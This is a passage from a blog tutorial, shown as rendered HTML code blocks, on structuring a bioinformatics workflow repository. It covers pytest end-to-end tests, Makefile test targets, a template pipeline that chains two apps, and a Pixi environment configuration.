<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> pytest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> pathlib </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> Path</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> subprocess</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> apps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">myapp</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">main </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> run_myapp</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">@pytest</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">mark</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">skipif</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> subprocess</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">"docker"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--version"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">returncode </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    reason</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Docker not available"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_run_myapp_e2e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tmp_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Test complete myapp execution."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input_file </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> tmp_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"input.txt"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">write_text</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"test data"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output_dir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> tmp_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"output"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    run_myapp</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify output</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output_dir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"result.txt"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>apps/myapp/Makefile</strong></p>
<div class="language-makefile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-makefile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">.PHONY: unittest e2e</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">unittest:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	pytest -v -k "not e2e" tests/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">e2e:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	pytest -v -k "e2e" tests/</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="template-for-new-workflow">Template for New Workflow<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#template-for-new-workflow" class="hash-link" aria-label="Direct link to Template for New Workflow" title="Direct link to Template for New Workflow" translate="no">​</a></h3>
<p><strong>Create the structure:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> workflows/mypipeline/tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> workflows/mypipeline/main.py</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> workflows/mypipeline/tests/test_e2e.py</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">touch</span><span class="token plain"> workflows/mypipeline/Makefile</span><br></span></code></pre></div></div>
<p><strong>workflows/mypipeline/main.py</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> argparse</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> apps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">myapp</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">main </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> run_myapp</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> apps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">anotherap</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">main </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> run_anotherap</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">run_mypipeline</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Compose myapp and anotherap into a pipeline."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 1: Run first app</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    intermediate_dir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">output_dir</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">/intermediate"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    run_myapp</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> intermediate_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 2: Run second app with output from first</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    final_dir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">output_dir</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">/final"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    run_anotherap</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">intermediate_dir</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">/result.txt"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> final_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Pipeline complete. Results in: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">final_dir</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"__main__"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    parser </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> argparse</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ArgumentParser</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">description</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"My bioinformatics pipeline"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    parser</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">add_argument</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"input_file"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    parser</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">add_argument</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"output_dir"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    args </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> parser</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">parse_args</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    run_mypipeline</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">args</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> args</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>workflows/mypipeline/tests/test_e2e.py</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> subprocess</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> pathlib </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> Path</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> workflows</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">mypipeline</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">main </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> run_mypipeline</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_mypipeline_e2e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tmp_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Test complete pipeline execution."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input_file </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> tmp_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"input.txt"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">write_text</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"test data"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    output_dir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> tmp_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"output"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    run_mypipeline</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify all outputs exist</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output_dir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"intermediate"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output_dir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"final"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>workflows/mypipeline/Makefile</strong></p>
<div class="language-makefile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-makefile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">.PHONY: e2e</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">e2e:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	pytest -v -k "e2e" tests/</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-6-reproducible-environment-with-pixi">Part 6: Reproducible Environment with Pixi<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#part-6-reproducible-environment-with-pixi" class="hash-link" aria-label="Direct link to Part 6: Reproducible Environment with Pixi" title="Direct link to Part 6: Reproducible Environment with Pixi" translate="no">​</a></h2>
<p>For maximum reproducibility, add Pixi support:</p>
<p><strong>pixi.toml</strong></p>
<div class="language-toml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-toml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[project]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">name = "bioinfor-wf"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">version = "0.1.0"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">channels = ["conda-forge", "bioconda"]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[dependencies]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">python = "3.12"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pytest = "&gt;=7.0"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">numpy = "&gt;=1.24"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pandas = "&gt;=1.5"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[tasks]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test = "pytest -v"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">unittest = "pytest -v -k 'not e2e'"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">e2e = "pytest -v -k 'e2e'"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ci = "act push"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[environments]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test = { channels = ["conda-forge", "bioconda", "nvidia"], features = ["gpu"] }</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">dev = { features = ["dev"] }</span><br></span></code></pre></div></div>
<p><strong>Usage:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install dependencies</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run tests</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" 